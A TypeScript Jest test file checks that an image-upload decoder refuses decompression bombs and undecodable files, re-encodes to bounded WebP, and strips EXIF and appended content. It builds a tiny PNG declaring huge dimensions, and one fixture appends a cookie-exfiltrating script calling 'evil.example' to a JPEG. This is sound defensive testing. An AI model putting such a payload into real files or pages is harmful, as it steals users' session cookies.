import sharp from 'sharp';
import { makeDerivative, ImageRejected, MAX_INPUT_PIXELS } from './image';

/**
 * T025 (feature 016, US1) — the decoder is UNTRUSTED-INPUT HANDLING, not a formatting utility.
 *
 * Q3 put a decoder on the ingest path deliberately, and the security argument runs both ways: image
 * decoders are a classic source of memory-safety bugs, but re-encoding is the only thing in this
 * feature that answers the polyglot case BY CONSTRUCTION. The serving headers (research R7) stop a
 * polyglot being *interpreted* and depend on the client obeying; a re-encoded derivative simply does
 * not contain the payload. These tests hold both halves of that bargain to account.
 *
 * Fixtures are generated here rather than committed: synthetic and brand-neutral by construction
 * (Principle V/VI), and small enough that the suite stays fast.
 */
jest.setTimeout(30_000);

const EDGE = 256;

/** A real, small raster with visible structure (so re-encoding has something to do). */
async function makeImage(
  format: 'png' | 'jpeg' | 'webp',
  width = 64,
  height = 64,
): Promise<Buffer> {
  const img = sharp({
    create: { width, height, channels: 3, background: { r: 40, g: 90, b: 160 } },
  });
  if (format === 'png') return img.png().toBuffer();
  if (format === 'jpeg') return img.jpeg({ quality: 90 }).toBuffer();
  return img.webp().toBuffer();
}

// ── A hand-built PNG header, so a "decompression bomb" costs no memory to construct ──────────────
function crc32(buf: Uint8Array): number {
  let c = ~0;
  for (const byte of buf) {
    c ^= byte;
    for (let k = 0; k < 8; k += 1) c = (c >>> 1) ^ (0xedb88320 & -(c & 1));
  }
  return ~c >>> 0;
}

function pngWithDeclaredSize(width: number, height: number, withIdat: boolean): Uint8Array {
  const sig = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];
  const ihdr = Buffer.alloc(17);
  ihdr.write('IHDR', 0, 'ascii');
  ihdr.writeUInt32BE(width, 4);
  ihdr.writeUInt32BE(height, 8);
  ihdr[12] = 8; // bit depth
  ihdr[13] = 2; // colour type: truecolour
  const chunk = Buffer.concat([
    Buffer.from([0, 0, 0, 13]), // IHDR data length
    ihdr,
    (() => {
      const b = Buffer.alloc(4);
      b.writeUInt32BE(crc32(ihdr), 0);
      return b;
    })(),
  ]);
  // Optionally a truncated IDAT: enough for the header to parse, nowhere near enough to decode.
  const idat = withIdat
    ? Buffer.concat([Buffer.from([0, 0, 0, 4]), Buffer.from('IDAT', 'ascii'), Buffer.from([0x78, 0x9c, 0x00, 0x00]), Buffer.alloc(4)])
    : Buffer.alloc(0);
  return Uint8Array.from(Buffer.concat([Buffer.from(sig), chunk, idat]));
}

async function reject(input: Uint8Array): Promise<ImageRejected> {
  try {
    await makeDerivative(input, EDGE);
  } catch (err) {
    if (err instanceof ImageRejected) return err;
    throw err;
  }
  throw new Error('expected the image to be refused');
}

describe('*** a decompression bomb is refused by the PIXEL limit, not the byte cap *** (research R5)', () => {
  it('a tiny file declaring 50 000 × 50 000 is refused', async () => {
    const bomb = pngWithDeclaredSize(50_000, 50_000, true);
    // The whole point: this is well under any purpose cap. A byte limit constrains what we ACCEPT,
    // never the memory needed to decode it — a 40 KB PNG can declare 2.5 billion pixels.
    expect(bomb.byteLength).toBeLessThan(1024);
    const err = await reject(bomb);
    expect(err.reason).toBe('pixel_limit');
  });

  it('the limit is a real number, and an image just under it is not refused for that reason', async () => {
    expect(MAX_INPUT_PIXELS).toBeGreaterThan(0);
    const justOver = pngWithDeclaredSize(MAX_INPUT_PIXELS, 2, true);
    expect((await reject(justOver)).reason).toBe('pixel_limit');
  });
});

describe('a file that cannot be decoded is refused, not best-efforted', () => {
  it('a valid PNG header with no usable image data is refused', async () => {
    const err = await reject(pngWithDeclaredSize(64, 64, true));
    // `failOn: 'error'` — a partially decodable file is a refusal, not a degraded thumbnail. A
    // half-decoded derivative would be served to users as if it were the file they uploaded.
    expect(err.reason).toBe('undecodable');
  });

  it('a PNG signature with nothing after it is refused', async () => {
    const err = await reject(Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]));
    expect(['undecodable', 'pixel_limit']).toContain(err.reason);
  });
});

describe('the output is what WE chose, never what the input suggested', () => {
  it.each(['png', 'jpeg', 'webp'] as const)('a %s input yields a WebP derivative', async (fmt) => {
    const derivative = await makeDerivative(Uint8Array.from(await makeImage(fmt)), EDGE);
    expect(derivative.contentType).toBe('image/webp');
    const meta = await sharp(Buffer.from(derivative.body)).metadata();
    expect(meta.format).toBe('webp');
  });

  it('the derivative is bounded by the requested longest edge', async () => {
    const wide = Uint8Array.from(await makeImage('png', 1200, 300));
    const meta = await sharp(Buffer.from((await makeDerivative(wide, EDGE)).body)).metadata();
    expect(Math.max(meta.width ?? 0, meta.height ?? 0)).toBeLessThanOrEqual(EDGE);
  });

  it('a small image is not enlarged to the edge', async () => {
    const small = Uint8Array.from(await makeImage('png', 32, 32));
    const meta = await sharp(Buffer.from((await makeDerivative(small, EDGE)).body)).metadata();
    expect(meta.width).toBe(32);
  });
});

describe('*** the derivative contains none of an appended payload *** (Q3 / SC-010b)', () => {
  it('a JPEG with HTML appended re-encodes to bytes carrying no trace of it', async () => {
    const payload = '<script>fetch("//evil.example/"+document.cookie)</script>';
    const polyglot = Uint8Array.from(
      Buffer.concat([await makeImage('jpeg'), Buffer.from(payload, 'utf8')]),
    );
    // The original genuinely carries it — otherwise this test proves nothing.
    expect(Buffer.from(polyglot).includes(payload)).toBe(true);

    const derivative = await makeDerivative(polyglot, EDGE);
    // Byte-wise, not "the header says image/webp": the claim is about content, so the check is too.
    expect(Buffer.from(derivative.body).includes(payload)).toBe(false);
    expect(Buffer.from(derivative.body).includes('script')).toBe(false);
  });
});

describe('*** EXIF does not survive into the derivative *** (research R5 — a privacy win, not a side effect)', () => {
  it('a marker written into EXIF is absent from the derivative', async () => {
    const MARKER = 'SYNTHETIC-EXIF-MARKER-016';
    const withExif = await sharp({
      create: { width: 64, height: 64, channels: 3, background: { r: 10, g: 20, b: 30 } },
    })
      .jpeg()
      .withExif({ IFD0: { Copyright: MARKER } })
      .toBuffer();
    expect(withExif.includes(MARKER)).toBe(true);

    const derivative = await makeDerivative(Uint8Array.from(withExif), EDGE);
    expect(Buffer.from(derivative.body).includes(MARKER)).toBe(false);
    // Stated honestly: the ORIGINAL still carries its EXIF, GPS included. It is served only on a
    // deliberate open, never in a list — which is the whole reason the derivative exists.
  });
});

describe('*** the derivative’s size is bounded regardless of the original’s *** (SC-010a)', () => {
  it('a heavy and a light image of the SAME dimensions yield derivatives under one ceiling', async () => {
    // Noise compresses badly, a flat fill compresses to almost nothing: same pixels, very different
    // bytes. If the derivative tracked the original's weight, a dense list of 50 avatars would still
    // transfer megabytes — which is the Principle VII case this whole decision exists to prevent.
    const size = 1024;
    const noisy = Buffer.alloc(size * size * 3);
    for (let i = 0; i < noisy.length; i += 1) noisy[i] = (i * 2654435761) % 251;
    const heavy = await sharp(noisy, { raw: { width: size, height: size, channels: 3 } })
      .png({ compressionLevel: 0 })
      .toBuffer();
    const light = await makeImage('png', size, size);

    expect(heavy.byteLength).toBeGreaterThan(light.byteLength * 10);

    const CEILING = 64 * 1024; // a 256 px WebP thumbnail, generously bounded
    const dHeavy = await makeDerivative(Uint8Array.from(heavy), EDGE);
    const dLight = await makeDerivative(Uint8Array.from(light), EDGE);

    expect(dHeavy.byteSize).toBeLessThan(CEILING);
    expect(dLight.byteSize).toBeLessThan(CEILING);
    // Asserted on Track A on purpose: a regression here should fail on the dev box, not only when
    // somebody measures bytes on beton-test.
    expect(dHeavy.byteSize).toBeLessThan(heavy.byteLength);
  });
});
